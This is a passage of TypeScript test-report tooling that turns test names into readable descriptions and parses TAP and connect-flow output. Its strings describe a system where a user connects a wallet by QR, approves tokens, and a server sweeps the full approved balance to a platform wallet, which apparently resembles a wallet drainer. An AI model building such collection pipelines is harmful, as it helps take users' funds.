  if (normalized.includes("batch-native-estimate")) {
    if (name.includes("does not send wallet session")) {
      return "Native estimate is public — no wallet session Authorization header";
    }
    if (name.includes("not transferable")) {
      return "Skips native batch when estimate says nothing to transfer";
    }
    if (name.includes("buildNativeWalletCall")) {
      return "EIP-5792 native call uses full transferable balance";
    }
  }

  if (normalized.includes("evm-token-batch")) {
    if (name.includes("shouldAttemptEip5792")) {
      return "EIP-5792 batch only when wallet advertises atomic support";
    }
    if (name.includes("does not batch Tron")) {
      return "TRON tokens stay as separate single approve units";
    }
    if (name.includes("groups consecutive EVM")) {
      return "Groups USDT/USDC on same EVM network with deferred native";
    }
  }

  if (normalized.includes("connect-flow/")) {
    if (name.includes("platform.env") && name.includes("spender")) {
      return "Uses real platform wallet addresses from config (not fake test keys)";
    }
    if (name.includes("QR") || name.includes("qr")) {
      return "User scans QR and connects their wallet";
    }
    if (name.includes("transferFrom") || name.includes("collector transfer")) {
      return "Server collects approved tokens to the platform wallet";
    }
    if (name.includes("zero balance")) {
      return "No transfer when the wallet balance is zero";
    }
    if (name.includes("COLLECTOR_ENABLED=false")) {
      return "Collection is skipped when turned off in settings";
    }
    if (name.includes("partial collection")) {
      return "Collects in multiple steps until the full amount is gathered";
    }
    if (name.includes("full pipeline") || name.includes("full journey")) {
      return "Complete path from connect through to collection";
    }
  }

  let friendly = name
    .replace(/platform\.env/gi, "platform settings")
    .replace(/transferFrom/gi, "token collection")
    .replace(/BigInt|raw|txHash/gi, "")
    .replace(/\bEVM\b/g, "Ethereum-style networks")
    .replace(/\bTRON\b/g, "TRON network")
    .replace(/collectorRunCount/gi, "collection attempts")
    .replace(/[_-]/g, " ")
    .replace(/\s+/g, " ")
    .trim();

  if (friendly.length > 0) {
    friendly = friendly.charAt(0).toUpperCase() + friendly.slice(1);
  }

  return friendly || name;
}

function inferArea(packageId: string, relFile: string): string {
  const normalized = relFile.replace(/\\/g, "/");

  if (packageId === "shared") {
    if (normalized.includes("token-collection-state"))
      return "Native execution policy";
    if (normalized.includes("transaction-lifecycle"))
      return "Transaction traceability";
    if (normalized.includes("observability")) return "Observability";
    if (normalized.includes("collection")) return "Collection (shared)";
    if (normalized.includes("collector")) return "Collection (shared)";
    return "Shared utilities";
  }

  if (packageId === "wallet-sdk") {
    if (normalized.includes("/approval/")) return "Approval orchestrator";
    if (normalized.includes("/authorization/"))
      return "Authorization / wallet phase";
    if (normalized.includes("/native-transfer/")) return "Native transfer";
    if (normalized.includes("/connect-flow/")) return "Connect flow";
    if (normalized.includes("transaction-context"))
      return "Transaction traceability";
    if (normalized.includes("/observability/")) return "Observability";
    if (normalized.includes("/server/")) return "Core / server";
    if (normalized.includes("/core/")) return "Core / server";
    return "Wallet SDK";
  }

  if (normalized.includes("/resources/")) return "Resources";
  if (normalized.includes("/connect-flow/")) return "Connect flow";
  if (normalized.includes("collection")) return "Collection (backend)";
  if (normalized.includes("native")) return "Native transfer";
  if (normalized.includes("pipeline") || normalized.includes("user-"))
    return "Admin / pipeline";
  if (
    normalized.includes("transaction-journey") ||
    normalized.includes("settlement-observability")
  )
    return "Transaction traceability";
  if (normalized.includes("admin") || normalized.includes("approval-state"))
    return "Admin / pipeline";
  if (normalized.includes("safe-audit") || normalized.includes("error-message"))
    return "Observability";
  if (normalized.includes("network-settlement"))
    return "Native execution policy";
  return "Backend";
}

function inferLayer(relFile: string): string {
  const name = relFile.toLowerCase();
  if (name.includes(".e2e.")) return "e2e";
  if (name.includes(".lifecycle.")) return "lifecycle";
  if (name.includes(".integration.")) return "integration";
  if (name.includes(".unit.")) return "unit";
  return "unit";
}

function matchesDefaultScript(relFile: string, patterns: string[]): boolean {
  if (patterns.length === 0) return false;
  const normalized = relFile.replace(/\\/g, "/");

  return patterns.some((pattern) => {
    const p = pattern.replace(/\\/g, "/");
    if (p.includes("*")) {
      const regex = new RegExp(
        "^" +
          p
            .replace(/[.+^${}()|[\]\\]/g, "\\$&")
            .replace(/\*\*/g, "§§")
            .replace(/\*/g, "[^/]*")
            .replace(/§§/g, ".*") +
          "$",
      );
      return regex.test(normalized);
    }
    return normalized === p || normalized.endsWith(`/${p}`);
  });
}

function parseConnectFlowRunSummary(
  stdout: string,
): ConnectFlowRunSummary | undefined {
  const normalized = stdout.replace(/\\n/g, "\n");
  const chunks = normalized.split("=== Connect flow test report ===").slice(1);
  if (chunks.length === 0) return undefined;

  const clean = (value: string | undefined): string | null => {
    if (!value) return null;
    const trimmed = value.replace(/\\+$/g, "").trim();
    return trimmed && trimmed !== "(unset)" ? trimmed : null;
  };

  let spenderEvm: string | null = null;
  let spenderTron: string | null = null;
  let platformEnvSource = "platform.env";
  let enabledNetworks: string[] = [];
  let collectorTransferCount = 0;
  const userAddresses = new Set<string>();

  for (const chunk of chunks) {
    spenderEvm = spenderEvm ?? clean(chunk.match(/spenderEvm:\s*(\S+)/)?.[1]);
    spenderTron =
      spenderTron ?? clean(chunk.match(/spenderTron:\s*(\S+)/)?.[1]);
    if (!platformEnvSource || platformEnvSource === "platform.env") {
      platformEnvSource =
        clean(chunk.match(/platform\.env:\s*(.+)/)?.[1]) ?? platformEnvSource;
    }
    if (enabledNetworks.length === 0) {
      enabledNetworks =
        chunk
          .match(/enabledNetworks:\s*(.+)/)?.[1]
          ?.split(",")
          .map((n) => clean(n))
          .filter((n): n is string => Boolean(n)) ?? [];
    }

    for (const match of chunk.matchAll(/\bfrom=([0-9a-zA-Z]+)/g)) {
      userAddresses.add(match[1]!.replace(/\\+$/g, ""));
    }

    const transfers = (chunk.match(/\[[\w]+\/[\w]+\] tx=/g) ?? []).length;
    if (transfers > collectorTransferCount) {
      collectorTransferCount = transfers;
    }
  }

  let testUserEvm: string | null = null;
  let testUserTron: string | null = null;
  for (const addr of userAddresses) {
    if (addr.startsWith("T")) testUserTron = addr;
    else if (addr.startsWith("0x")) testUserEvm = addr;
  }

  const summaryParts = [
    "All checks passed.",
    `Settings loaded from ${platformEnvSource}.`,
    spenderEvm ? `Platform spender (EVM networks): ${spenderEvm}.` : null,
    spenderTron ? `Platform spender (TRON): ${spenderTron}.` : null,
    testUserEvm ? `Mock user wallet (EVM): ${testUserEvm}.` : null,
    testUserTron ? `Mock user wallet (TRON): ${testUserTron}.` : null,
    enabledNetworks.length > 0
      ? `Networks covered: ${enabledNetworks.join(", ")}.`
      : null,
    collectorTransferCount > 0
      ? `${collectorTransferCount} simulated collector transfer(s) moved tokens from user wallets to the platform spender.`
      : "Wallet approvals were verified against the platform spender addresses.",
  ].filter(Boolean);

  return {
    platformEnvSource,
    spenderEvm,
    spenderTron,
    enabledNetworks,
    testUserEvm,
    testUserTron,
    collectorTransferCount,
    summary: summaryParts.join(" "),
  };
}

function parseTapOutput(stdout: string): TestRunResult["report"] {
  const cases: TestRunCaseResult[] = [];
  const lines = stdout.split("\n");
  let current: TestRunCaseResult | null = null;
  let errorLines: string[] = [];

  for (const line of lines) {
    const okMatch = line.match(
      /^ok \d+(?:-\d+)?(?: \+\d+ms)? - (.+?)(?: \# SKIP.*)?$/,
    );
    const notOkMatch = line.match(/^not ok \d+(?:-\d+)?(?: \+\d+ms)? - (.+)$/);

    if (okMatch) {
      if (current?.status === "fail" && errorLines.length) {
        current.error = errorLines.join("\n").trim();
        errorLines = [];
      }
      const skipped = line.includes("# SKIP");
      current = { name: okMatch[1], status: skipped ? "skip" : "pass" };
      cases.push(current);
      continue;
    }

    if (notOkMatch) {
      if (current?.status === "fail" && errorLines.length) {
        current.error = errorLines.join("\n").trim();
        errorLines = [];
      }
      current = { name: notOkMatch[1], status: "fail" };
      cases.push(current);
      continue;
    }

    if (
      current?.status === "fail" &&
      (line.startsWith("  ") || line.startsWith("\t"))
    ) {
      errorLines.push(line.trim());
    }
  }

  if (current?.status === "fail" && errorLines.length) {
    current.error = errorLines.join("\n").trim();
  }

  const passed = cases.filter((c) => c.status === "pass").length;
  const failed = cases.filter((c) => c.status === "fail").length;
  const skipped = cases.filter((c) => c.status === "skip").length;

  return {
    passed,
    failed,
    skipped,
    total: cases.length,
    cases,
  };
}
